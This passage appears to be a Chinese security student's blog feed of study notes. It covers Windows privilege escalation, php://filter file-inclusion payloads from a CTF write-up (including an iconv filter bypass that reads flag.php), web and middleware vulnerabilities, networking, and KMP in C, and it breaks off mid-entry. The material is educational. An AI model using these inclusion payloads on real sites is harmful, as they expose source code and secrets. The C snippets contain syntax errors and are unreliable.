    <content type="html"><![CDATA[<h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><h3 id="windows提权基本知识"><a href="#windows提权基本知识" class="headerlink" title="windows提权基本知识"></a>windows提权基本知识</h3><p>windows不同的用户有着不同的权限，权限主要包括：完全控制、修改、读取和执行、列出文件夹内容、读取、写入<br>超级管理员和system权限最高<br><strong>内置用户</strong><br>Administrator，系统管理员账号，拥有完全控制权<br>guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用<br><img src="/img/win%E6%8F%90%E6%9D%831.png" srcset="/img/loading.gif" lazyload><br>基本命令<br>net user 查看本地用户<br>net user administrator 查看用户详细信息<br>net localgroup  查看本地组 组分为管理组(Administrator)、普通用户组(user)、iis用户组(IIS_IUSRS)、来宾组(Guests)、远程登录组(Remote Desktop)<br><strong>用户信息</strong><br>whoami 命令<br>whoami &#x2F;all</p><p>windows的sid详解<br>Windows安全性要依赖于几个基本元素。：访问令牌、SID、安全描述符、访问控制列表、密码。<br>访问令牌：访问令牌的内容和功能由用户的SID、登录SID、用户特权、默认所有者、默认组SID、默认DACL、起源进程、令牌类型、模拟级别、受限SID。<br>权限：一个用户进程在接触一个对象时，“安全性参考监视器”将访问令牌中的SID与“对象访问控制列表（ACL）”中的SID匹配。可能出现的两种情况：1、如果没有匹配，就拒绝用户访问，这称为“隐式拒绝访问”2、如果有一个区配，就将与ACK中的条目关联的权限授予给用户。这可能是Allow，也可能是Deny权限。在两个权限都直接派给对象的前提下，Deny权限将优先于Allow权限</p><p><strong>漏洞提权</strong></p><p>webshell根据不同的中间件，权限也有所不同，如果没有经过特殊处理，webshell的权限是继承该中间件的权限<img src="/img/win%E6%8F%90%E6%9D%832.png" srcset="/img/loading.gif" lazyload></p><h3 id="提权常见的方法"><a href="#提权常见的方法" class="headerlink" title="提权常见的方法"></a>提权常见的方法</h3><p>windows的常用提权方法，主要分为漏洞提权、Windows特性提权、第三方组件提权，数据库提权ftp<br>提权命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">提权常用命令systeminfo | findstr OS <span class="hljs-comment">#获取系统版本信息</span><br>hostname <span class="hljs-comment">#获取主机名称</span><br><span class="hljs-built_in">whoami</span> /all <span class="hljs-comment">#获取当前用户的详细信息</span><br><span class="hljs-built_in">whoami</span> /priv <span class="hljs-comment">#显示当前用户安全特权</span><br>net staet <span class="hljs-comment">#查看服务</span><br>quser or query <span class="hljs-comment">#获取在线用户</span><br>netstat -ano | findstr 3389  <span class="hljs-comment">#获取rdp连接来源IP</span><br><span class="hljs-built_in">dir</span> c:\programdata\ <span class="hljs-comment">#分析安装杀软</span><br></code></pre></td></tr></table></figure><p>windows提权流程<br>能够执行cmd命令-&gt;是否打补丁-&gt;补丁对应的exp-&gt;获取服务器权限</p><ol start="5"><li><p>MS16-075(烂土豆)提权原理<br>攻击者诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机！<br>Microsoft通过使用已经进行的质询来禁止同协议NTLM身份验证来对比进行修补。这意味着从一主机回到自身SMB-&gt;SMB NTLM中继将不再起作用。但是，跨协议攻击（例如HTTP-&gt;SMB）仍然可以起作用。</p><p>通俗解释：<br>1、我们控制HTTP流量大概都流经我们控制的HTTP服务器，做中介人攻击<br>2、可以诱导系统高权用户执行一些操作，例如将它们重定向到需要NTLM身份验证的地方。所有NTLM凭据都将中继到本地SMB侦听器，以创建运行用户定义的命令的新系统服务，例如是windows updata服务请求时，就会是一个高权限令牌，劫持掉这个令牌<br>3、最后模仿这个高权限令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌<br><strong>烂土豆提权也被称为“令牌复制”（Token Duplication）攻击。</strong></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2023/04/05/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/04/05/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>php:&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似readfile()、file()和file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单点说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当他包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件被读取。</p><p>协议参数<br>resource&#x3D;&lt;要过滤的数据流&gt;  这个参数是必须的，它指定了你要筛选过滤的数据流<br>read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤名称，以管道符( | )分隔<br>write&#x3D;&lt;写链的筛选列表&gt; 该参数可选，以管道符（ | ）分隔<br>&lt;;两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链<br>常用<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php<br>利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处是如果不进行编码，文件包含后就不会有输出结果，而是当作php文件执行了，而通过编码后则可以读取文件源码。<br>使用convert.base64-encode，就是一种过滤器。</p>]]></content>
    
    
    <categories>
      
      <category>php协议</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含1</title>
    <link href="/2023/04/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/04/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p><img src="http://rs5kgysfr.hn-bkt.clouddn.com/1%7D%25H9LXSAH2RG~%244AF20%295P.png" srcset="/img/loading.gif" lazyload><br>这一个文件包含还比较简单，首先GET请求获取一个filename文件，判断文件是否存在，若存在则将其包含，我们则尝试去获取check.php里面的内容。<br>我们直接构造payload:?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;check.php<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/L%5D2ZA367HQS0S0%24V%40VY%401BG.png" srcset="/img/loading.gif" lazyload><br>这里回显do not hack 所以可能遭到了过滤，经过尝试发现read，base64，encode都被过滤了<br>如同string. *过滤器，convert. *作用和其名字一样，对于指定过滤器的更多信息<br>接下来我们进行尝试<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/H%5BW%5DE4FM1E_PJ4IA78I~V46.png" srcset="/img/loading.gif" lazyload><br>发现string被过滤了于是选择使用convert，convert. *过滤器支持convert.iconv. *格式<br>convert.iconv.<input-encoding>.<output-ending><br>或者convert.iconv.<input-encoding>&#x2F;<output-ending><br>构造payload：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8 *.UCS-4LE *&#x2F;resource&#x3D;flag.php</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>串的模式匹配</title>
    <link href="/2023/04/04/%E4%B8%B2%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D/"/>
    <url>/2023/04/04/%E4%B8%B2%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span>   <span class="hljs-type">char</span> data[MaxSize];<br>    <span class="hljs-type">int</span> length;<br>&#125;SqString<br></code></pre></td></tr></table></figure><p>Brute-Force算法<br>Brute-Force算法简称暴力算法，也称简单匹配算法。<br>例如目标串s&#x3D;”aaaaab”,模式串t&#x3D;”aaab”<br>s:a a a a a b<br>t:a a a b        从第一个开始匹配<br>t:   a a a b     从第二个开始匹配<br>t:      a a a b  从第三个开始匹配<br>这种算法简单且易于理解，但效率不高</p><p>KMP算法(以空间换时间)</p><ol><li><p>首先从串中提取加速匹配的信息<br>例如模式串t&#x3D;”aaab”的数组,我们规定next[0]&#x3D;-1 next[1]&#x3D;0</p><table><thead><tr><th align="center">j</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th></tr></thead><tbody><tr><td align="center">t[j]</td><td align="center">a</td><td align="center">a</td><td align="center">a</td><td align="center">b</td></tr><tr><td align="center">next[j]</td><td align="center">-1</td><td align="center">0</td><td align="center">1</td><td align="center">2</td></tr></tbody></table><p>next[j]是指t[j]前最多有多少字符与t开头字符相同，且数量小于j</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">GetNext</span><span class="hljs-params">(SqString t,<span class="hljs-type">int</span> next[])</span><br>&#123;<br>    <span class="hljs-type">int</span> j,k;<br>    j=<span class="hljs-number">0</span>;k=<span class="hljs-number">-1</span>;<br>    next[<span class="hljs-number">0</span>]=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(j&lt;t.length<span class="hljs-number">-1</span>)<br>    &#123;   <span class="hljs-keyword">if</span>(k==<span class="hljs-number">-1</span>)||t.data[j]==t.data[k])<br>      &#123;  j++;k++;<br>        next[j]=k;<br>      &#125;<br>        <span class="hljs-keyword">else</span> k=next[k]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>KMP算法的模式匹配<br>目标串s&#x3D;”aaaaab”，模式串t&#x3D;”aaab”<br>        |<br>s:a a a a a b                      s:a|a a|a a b       s:a a a a a b<br>t :a a a b                            t:|a a|a b             t:   a a a b</p><p>第四个匹配出现错误      s1 s2 等于t0 t1     t右滑动一格继续匹配</p><p>再举个例子目标串s&#x3D;”abaaab”，模式串t&#x3D;”abab”<br>           |<br>s:a b a b a a b                       s: a b|a b|a a b      s:a b a b a a b<br>t: a b a b b                             t: |a b|a b b            t:      a b a b<br>第五个出现错误               s2 s3等于t1 t1          t右滑动两格继续匹配</p><p>KMP对应的算法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">KMPIndex</span><span class="hljs-params">(SqString s,SqString t)</span>    <span class="hljs-comment">//KMP算法</span><br>&#123;<br>   <span class="hljs-type">int</span> next[MaxSize],i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>   GetNext(t,next);<br>   <span class="hljs-keyword">while</span>(i&lt;s.length&amp;&amp;j&lt;t.length)<br>   &#123;   <span class="hljs-keyword">if</span>(j==<span class="hljs-number">-1</span>||s.data[i]==t.data[j])<br>       &#123;  i++;<br>          j++;                         <span class="hljs-comment">//i,j各增一</span><br>       &#125;<br>       <span class="hljs-keyword">else</span> j=next[j];                 <span class="hljs-comment">//i不变，j后退</span><br>   &#125;<br>    <span class="hljs-keyword">if</span>(j&gt;=t.length)                    <span class="hljs-comment">//匹配成功</span><br>        <span class="hljs-keyword">return</span>(i-t.length);            <span class="hljs-comment">//返回字串的位置</span><br>    <span class="hljs-keyword">else</span>                               <span class="hljs-comment">//匹配不成功</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);                    <span class="hljs-comment">//返回-1</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库</title>
    <link href="/2023/04/03/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2023/04/03/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>MYSQL数据库管理（增删改查）<br>1、查看数据库结构<br>查看当前数据库结构<br>SHOW DATABASES；<br>设置密码<br>mysqladmin -u root -p password “abc123”<br>远程登陆<br>musql -u root -p (密码)<br>查看数据库中的表<br>USE 数据库名；<br>SHOW TABLES；<br>查看表的结构<br>USE 数据库名；<br>DESC 表名；<br>2、创建及删除数据库表<br>创建新的数据库<br>CREATE DATABASES 数据库；<br>创建新的表<br>CRAETE TABLE 表名 （字段1 数据类型，字段2 数据类型[]）<br>CREATE TABLE MM(id int NOT NULL,name char(10) NOT NULL,age char(2),sex,DEFAULT ‘ ‘,PRIMARY KEY(id));<br>删除指定数据<br>DROP TABLE [数据库名.]表名；<br>删除指定数据库<br>DROP DATABASE 数据库名；<br>3、管理表中的数据记录<br>向数据表中插入新的数据记录<br>INSERT INTO 表名（字段1，字段2[,..]）valuses(1,’张三’,20,’男’)<br>查询数据名<br>SELECT 字段名1,字段名2[ ] FROM表名 [WHERE 条件表达式];<br>修改、更新数据表中的数据<br>UPDATE 表名 SET 字段名1&#x3D;字段值2[，字段名2&#x3D;字段值2][WHERE 条件表达式]<br>UPDATE CW SET age&#x3D;25 WHERE name&#x3D;’张三’;<br>在数据库表中删除指定的数据记录<br>DELETE FROM 表名 [WHERE 条件表达式]<br>4、修改表名和数据结构<br>修改表名<br>ALTER TABLE 旧表名 RENAME 新表名<br>ALTER TABLE CW RENAME MM；<br>扩展表名字（增加字段）<br>ALTER TABLE 表名 ADD address varchar(50) defafult ‘地址不详’；</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议</title>
    <link href="/2023/04/03/TCP-IP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/04/03/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>OSI七层模型<br>应用层、表示层、会话层、传输层、网络层、数据链路层、物理层<br>TCP&#x2F;IP协议<br>应用层、传输层、网络层、链路层<br>TCP&#x2F;IP常见的协议有<br>1、应用层：HTTP(超文传输协议)、FTP(文件传输协议)、SMTP(邮件传输协议)、SSH(远程登录协议)<br>该层协议所提供的服务能直接支持用户应用<br>2、传输层：UDP、TCP<br>端到端的连接提供传传输服务<br>TCP是一个面向连接的、可靠的传输协议<br>UDP是一个无连接的数据报协议<br>总的来说TCP传输效率低，但是可靠性强；UDP协议传输效率高，但是可靠性较低<br>3、网络层：ICMP、IP、IGMP<br>网络层负责将数据传输到目标地址<br>4、链路层：ARP、RARP<br>链路层有时候也被称为数据链路层或者网络接口层，用来处理连接网络的硬件部分<br>集线器-物理层，交换机-数据链路层，路由器-网络层，<br>MAC地址也称为物理地址，形如aa-bb-cc-dd交换机：<br>交换机内有一张MAC地址表，记录着每一个MAC地址的设备，连接在其哪一个端口上，交换机通过自己维护的MAC地址表，发现目标机器B的MAC地址bb-bb-bb-bb映射到了端口1上，于是把数据从1号端口发给了B，通过这种方式组成的小范围网络叫做以太网。<br>路由器：<br>由于交换机接口有限，当电脑数量成千上万时，需要很多交换机，此时需要路由器将他们连接起来<br>路由器每一个端口都有一个MAC地址，假若我们想要成千上万台电脑传输信息，则需要先将信息全部传输到路由器，再由路由器分发到对应的电脑，于是我们设置了IP，将IP地址192.168.197.0开头的全部发送到路由器<br>子网、掩码：<br>假若计算机A192.168.197.1，计算机B192.168.197.7则两个计算机在同一子网中，可通过交换机进行数据传输。计算机C192.168.1.2与上面两个计算机不在同一子网中，需要通过路由器进行信息传递。但是机器无法向人类这样进行区分，于是发明了掩码，以上三台机器的掩码为225.225.225.0，掩码与IP进行运算后，计算机A：192.168.197.0，计算机B：192.168.197.0，计算机C：192.168.1.0，通过比较此时机器知道计算机A与B在统一子网中，C则不再同一子网中。<br>网关：<br>计算机A无法区分谁是路由器，于是我们在路由器中设置自己的IP地址也就是网关，当计算机A发现要发送消息的对象不在同一子网中时，则将消息发送给网关（也就是路由器，当然说发送给网关更准确），路由器如何将接受的消息发送给对应的目标呢，它有自己的路由表，</p><p>详细过程：首先计算机A通过子网掩码计算出与计算机F是否在同一子网内，（假若在，则通过交换机直接传输信息），若不在则通过ARP协议找到默认网关的MAC地址。此时将源MAC地址与网关MAC地址封装在数据链路层表头（至始至终只有MAC地址在不断变化，而IP地址都不变），又将源IP地址和目标IP地址封装在网络层表头然后发包。交换机1收到数据包的时候发送给目标路由器，此时数据包来到路由器，发现目标IP并查看路由表跳转到下一地址，此时再匹配路由表，并将目标MAC封装到数据链库层，然后发送给路由器2，路由器查表查看到目标IP对应的端口，此时再查看arp缓存找到MAC地址，并且发送出去，最终目标收到了包。</p><p>TCP三次握手<br>第一次握手：客户端发送连接请求<br>第二次握手：服务端返回ACK确认<br>第三次握手：客服端收到ACK确认后，进入ESTABLISHED，并且发送ACK确认，此时服务端收到后也进入ESTABLISHED，此时通信连接建立成功<br>TCP四次挥手<br>第一次挥手：主动断开方，向对方发送一个结束请求包<br>第二次挥手：收到主动断开方的请求后，被动断开方会发送ACK响应报文，表示同意断开，此时被动断开方进入关闭等待的过程（CLOSE-WAIT）对方向本地的连接已经关闭了，但是本地向对方传输文件对方还是会接收的。<br>第三次挥手：被动断开方的数据发送完了或者CLOSE-WAIT（关闭等待）状态截止后会向对方发送ACK，被动断开方进入LAST_ACK状态<br>第四次挥手：主动断开方收到ACK确认报文进入TIME-WAIT状态，等待超时后则会主动断开，在等待2MSL后，如果期间没有收到其他报文则说明对方已经关闭，自己也会进行关闭</p>]]></content>
    
    
    <categories>
      
      <category>计网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSI七层模型</title>
    <link href="/2023/04/03/%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/04/03/%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>应用层<br>表示层<br>会话层<br>传输层<br>网络层<br>数据链路层<br>物理层<br>常见的端口<br>http 80(超文本传输协议)  https 443(以安全为目的http安全通道) FTP 21(文件传输协议)  SMTP 25(邮件传输协议)  文件共享 SMB 445   ssh 22(加密登录) 1433mssql  3306 Mysql  6379 redis 7001Weblogic</p><p>TCP协议为什么时可靠的<br>TCP是基于连接的，在进行数据传输前要先进行三次握手建立连接<br>UDP协议<br>收发协议不需要建立连接，而且没有TCP协议中的ACK确认</p>]]></content>
    
    
    <categories>
      
      <category>计网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应</title>
    <link href="/2023/04/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2023/04/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<p>windows应急响应<br>准备-检测-抑制-根除-恢复-总结、<br>一、检查系统账号安全<br>1 查看是否有弱口令，远程端口是否对外开放<br>2 查看服务器是否存在可疑账号、新增账号<br>二、检查异常端口、进程<br>1、检查端口连接情况，是否有远程连接，可疑连接，用netstat -ano检查端口<br>2、输入msinfo32可查看看进程路径、文件创建时间、文件启动时间等信息<br>三、检查启动项、计划任务<br>1、检查端口是否有异常启动项，查看注册表查看开机项是否正常启动<br>2、控制面表的任务计划查看计划任务属性，发现木马文件路径<br>四、查看系统相关信息<br>1、输入systeminfo查看系统信息<br>2、查看用户目录，是否创建新的用户</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中间件漏洞</title>
    <link href="/2023/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>IIS(php中间件漏洞）</p><p>1、IIS 6 解析漏洞 .php;.jpg<br>2、IIS 7 解析漏洞  .jpg&#x2F;.png&#x2F;.php<br>3、PUT任意文件解析漏洞 开启webDAV可写入权限<br>4、IIS短文件名漏洞 后缀长度</p><p>Apache(php中间件)<br>1、addHandler导致的解析漏洞  .php<br>2、APache HTTPD 换行解析漏(CVE-2017-15715)<br>3、未知扩展名解析漏洞 从右往左解析不认识解析下一个<br>4、目录遍历 (当用户访问目录的，会寻找一个文件index list)</p><p>Nginx(php中间件)<br>1、配置文件错误导致的解析漏洞(Nginx和FastCGI处理程序不同)<br>2、文件名逻辑漏洞(非法字符空格和截止符号导致Nginx状态混乱)<br>3、目录遍历<br>4、CRLF注入<br>5、目录穿越</p><p>Tomcat(java中间件)<br>1、任意文件写入（CVE-2017-12615）<br>2、远程代码执行（CVE-2019-0232）<br>3、弱口令+war后门文件部署</p><p>WebLogic(java中间件漏洞)<br>1、弱口令+后台部署war包getshel<br>2、反序列化远程代码执行漏洞（CVE-2019-2725)<br>3、反序列化命令执行漏洞（CVE-2019-2725）<br>4、任意文件上传漏洞（CVE-2019-2725)<br>5、SSRF漏洞（CVE-2018-2894）</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web安全漏洞</title>
    <link href="/2023/04/03/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9Ectf/"/>
    <url>/2023/04/03/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9Ectf/</url>
    
    <content type="html"><![CDATA[<p>OWASP十大漏洞</p><p>1、SQL注入<br>2、失效身份验证和会话管理<br>3、跨脚本攻击<br>4、失效的访问控制<br>5、安全配置错误<br>6、敏感信息泄露<br>7、跨站请求伪造<br>8、中间件漏洞</p><p>SQL注入<br>基本注入方式<br>SQL注入分类<br>1、可联合查询注入<br>2、堆叠查询<br>3、布尔型注入<br>4、报错注入<br>5、基于时间延迟注入</p><p>接受请求类型区分<br>1、GET注入<br>2、POST注入<br>3、COOKIE注入<br>注入数据<br>1、数字注入<br>2、字符型注入<br>3、搜索型注入</p><p>SQL注入原理<br>参数用户可控：从前端传给后端的参数内容用户是可控的<br>参数代入数据库查询：传入的参数拼接到SQL语句，且代入数据库查询。</p><p>SQL注入常规利用思路<br>1、寻找注入点，可以通过web扫描工具实现<br>2、通过注入点，尝试获得关于数据库用户名、数据库名称、连接数据库权限<br>3、猜测关键数据库表及其字段与内容<br>4、利用信息获取用户信息，寻找后台登陆。</p><p>SQL注入防御<br>1、预编译语句<br>2、函数过滤转义<br>2、限制数据类型</p><p>文件上传漏洞<br>程序员没有对上传文件进行严格过滤或者验证，而导致用户上传越过其本身权限向服务器上传可执行脚本。</p><p>上传方法<br>1、未作任何过滤直接上传文件<br>2、改写后缀名<br>3、绕过黑名单<br>4、空格绕过上传<br>5、双写后缀名绕过</p><p>防御方法<br>1、服务器启动白名单防御<br>2、修复中间件漏洞<br>3、限制后缀名<br>4、禁止客户端存在可控参数</p><p>XSS漏洞<br>用户将恶意的代码植入到web网站里面，供给其他用户访问，当用户访问到有恶意的代码，网页就会产生xss攻击</p><p>XSS类型分类<br>1、反射型XSS<br>2、存储型XSS<br>3、dom型XSS</p><p>XSS防御总体思路是：对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉脚本执行的相关内容；然后对动态输出到页面进行html编码，使得脚本无法在浏览器中执行</p><p>CSRF漏洞原理<br>用户登录网站A，登录成功后服务器向用户浏览器发送cookie，此时用户并没有退出网站A，同时登录网站B，网站B收到用户请求返回恶意代码攻击网站A，网站A认为此操作是已授权的用户执行的，从而导致网站B的恶意代码被执行</p><p>CSRF防御方案<br>1、增加token验证<br>2、增加验证码<br>3、访问控制安全管理（修改敏感信息需要二次验证）</p><p>SSRF漏洞原理<br>SSRF形成的大多数原因是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br>例如，黑客操作服务端从指定的URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造</p><p>SSRF防御方案<br>1、禁止跳转<br>2、禁止不需要的协议，仅仅允许http和https请求。<br>3、限制端口</p><p>XXE漏洞原理<br>由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的漏洞</p><p>XXE漏洞防御<br>1、禁用外部实体的方法<br>2、过滤用户提交的XML数据</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>溯源</title>
    <link href="/2023/04/03/%E6%BA%AF%E6%BA%90/"/>
    <url>/2023/04/03/%E6%BA%AF%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<p>一、溯源方法<br>攻击源捕获-溯源处理-攻击者画像<br>二、攻击源捕获来源<br>1、审查邮件钓鱼<br>2、获取安全设备数据进行分析，特别是流量数据<br>3、网络资产所在服务器运行状态<br>4、中间件日志信息查看<br>5、合理使用蜜罐系统进行溯源追踪<br>三、溯源处理<br>1、域名查询<br>2、IP查询<br>3、身份查询<br>4、文件查询<br>四、攻击者画像<br>1、攻击路径<br>2、攻击目的<br>3、网络代理<br>4、攻击手法<br>5、攻击者的身份构成<br>虚拟身份：ID、名称、网名<br>真实身份：姓名、家庭<br>联系方式：手机号、QQ&#x2F;微信<br>组织情况：单位名称、职位信息</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全设备</title>
    <link href="/2023/04/03/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"/>
    <url>/2023/04/03/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<p>1、基础防火墙FW<br>主要是实现基本包过滤的防火墙，运用于数据链路层、网络层、传输层，可以拦截底层攻击行为，但是对应用层的深层攻击无能为力<br>(1)防火墙的功能 防火墙对于流经它的流量会进行扫描，这样能够过滤掉一些攻击。防火墙还可以关闭掉不使用的端口。而且可以封锁特定端口的通信，封锁特洛伊木马。可以禁止来不明入侵者的所有通信</p><p>2、IDS<br>入侵检测系统，主要是以提供方报告为主，侧重于风险管理,会监视分析用户及系统构造弱点</p><p>3、IPS<br>监视网络或网络设备的网传输行为，主要作用是实时阻断入侵行为，侧重于风险控制。主要布置在主干路上，对内外网进行流量分析</p><p>检测webshell设备D盾 河马  动态感知设备奇安信的天眼、网御星云、</p><p>VPN:虚拟专用网络，在公网上建立专用网络进行加密通讯CDN:内容分发网络提高用户访问网站的响应速度</p><p>系统加固 账户安全windows<br>比如设置登录时不显示上次登录的用户名，防止弱口令爆破。设置账户锁定策略，比如说登录行为限制次数，达到次数后锁定多长时间<br>Linux<br>禁用root之外的超级用户 显示普通用户用duso提权，或者说限制提权大小，设置账号锁定登录次数<br>口令安全<br>windows设置密码必须符合复杂度的要求，设置最小密码长度不能为0，设置不能用历史密码<br>Linux<br>修改口令复杂度，设置密码有效期</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表</title>
    <link href="/2023/03/30/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/03/30/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>简单的记录下数据结构的学习过程</p><ol><li><p>数据结果添加了一些新东西，typedef int ElemType，这个语句类似于宏定义，用关键字typedef申明了一个新型数据类型，在这里他指明ElemType是int数据类型的别名</p></li><li><p>在单链表中，每个节点类型用LinkNode表示，它应该包括存储元素的数据域，这里用data表示，其类型用通用的ElemType表示，还包括存储后继节点的指针域，这里用next表示，LinkNode声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span></span><br><span class="hljs-class">&#123;</span> ElemType data;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 